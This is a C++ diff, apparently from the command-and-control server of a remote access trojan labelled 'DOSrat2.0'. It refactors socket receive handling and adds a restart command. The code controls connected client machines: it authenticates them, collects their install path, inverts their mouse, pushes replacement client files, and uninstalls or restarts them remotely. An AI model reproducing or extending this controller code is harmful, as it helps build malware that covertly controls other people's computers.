@@ -13,6 +13,7 @@ public:
 	static void Inizializzazione(int ID, SOCKET Sock)
 	{
 		char Pass[10]; // DOSrat2.0
+		string Buff;
 
 		TcpIP::SetTimeout(10000, Sock);
 
@@ -33,8 +34,9 @@ public:
 		}
 
 		TcpIP::SetTimeout(0, Sock);
+		TcpIP::RecvString(Sock, Buff);
 
-		json data = json::parse(TcpIP::RecvString(Sock));
+		json data = json::parse(Buff);
 
 		Clients[ID].IsConnected = true;
 		Clients[ID].info.InstallPath = data["InstallPath"];
@@ -52,14 +54,13 @@ public:
 
 	static json GetInfo(SOCKET Sock)
 	{
-		string Buff;
+		string Buff = "";
 		json j;
 
-		TcpIP::SendString(Sock, "getinfo");
+		if (!TcpIP::SendString(Sock, "getinfo"))
+			return j;
 
-		Buff = TcpIP::RecvString(Sock);
-
-		if(Buff != "")
+		if(TcpIP::RecvString(Sock, Buff))
 			j = json::parse(Buff);
 
 		return j;
@@ -71,7 +72,7 @@ public:
 
 		TcpIP::SendString(Sock, "invertmouse");
 
-		Buff = TcpIP::RecvString(Sock);
+		TcpIP::RecvString(Sock, Buff);
 
 		return Buff;
 	}
@@ -98,17 +99,26 @@ public:
 
 	static bool UpdateClient(SOCKET Sock, string FileContent)
 	{
+		string Buff;
+
 		if (!TcpIP::SendString(Sock, "updateclient"))
 			return false;
 
 		if (!TcpIP::SendString(Sock, FileContent))
 			return false;
 
-		return (TcpIP::RecvString(Sock) == "OK");
+		TcpIP::RecvString(Sock, Buff);
+
+		return (Buff == "OK");
 	}
 
 	static bool Uninstall(SOCKET Sock)
 	{
 		return TcpIP::SendString(Sock, "uninstall");
+	}
+
+	static bool RestartClient(SOCKET Sock)
+	{
+		return TcpIP::SendString(Sock, "restart");
 	}
 };
